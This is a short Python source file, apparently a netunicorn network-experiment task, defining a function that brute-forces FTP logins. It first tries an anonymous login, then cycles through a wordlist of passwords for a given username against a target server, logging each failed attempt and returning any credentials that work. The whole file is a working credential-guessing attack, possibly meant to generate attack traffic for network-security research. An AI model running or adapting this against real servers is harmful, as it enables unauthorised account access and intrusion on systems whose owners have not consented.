#!/usr/bin/env python
# -*- coding:utf-8 -*-

import argparse
import sys
from ftplib import FTP

from netunicorn.base.task import Task

def brute_force(target, username, wordlist):
    try:
        ftp = FTP(target)
        ftp.login()
        ftp.quit()
        return {'user': 'anonymous', 'password': 'anonymous'}
    except:
        pass

    try:
        for password in wordlist:
            try:
                # print(f'trying {password}')
                ftp = FTP(target)
                ftp.login(username, password)
                ftp.quit()
                return {'user': username, 'password': password}
            except:
                print(f"[Attempt] target:- {target} - login:{username} - password:{password}")
        return  {'user': None, 'password': None}
    except:
        print('\nError with wordlist list')
        sys.exit(0)


